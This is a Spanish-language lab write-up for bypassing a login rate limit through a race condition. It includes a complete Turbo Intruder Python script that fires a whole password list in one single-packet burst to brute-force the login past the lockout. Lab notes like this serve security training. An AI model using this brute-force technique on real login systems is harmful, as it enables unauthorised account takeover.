
---
- Tags: #owasp 
---


### Lab: Bypassing rate limits via race conditions


Este laboratorio nos limita a no poder realizar ataque de fuerza bruta tradicional en panel Login. De modo que nos arroja un error de limite de intentos al ingresar incorrectamente la contraseña por 3 intentos seguidos

Lo que haremos será:
- Interceptar la peticion POST de  /login,  mandarla al intruder (podemos darle drop para que no cuenta el intento)
- En el intruder seleccionamos el campo a fuzzear, click dereecho, extensiones, sent o turbo intruder (instalar si no viene)
- Cambiamos a examples/race-single-packet-attack.py
- Podemos usar el siguiente payload

```python
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```

- En este caso el "Diccionario" de palabras, tomará en cuenta lo que tengas en la clipboard

Solamente seria hacer un par de veces el procedimiento y analizar las respuestas de las peticiones para determinar algun acceso correcto

----
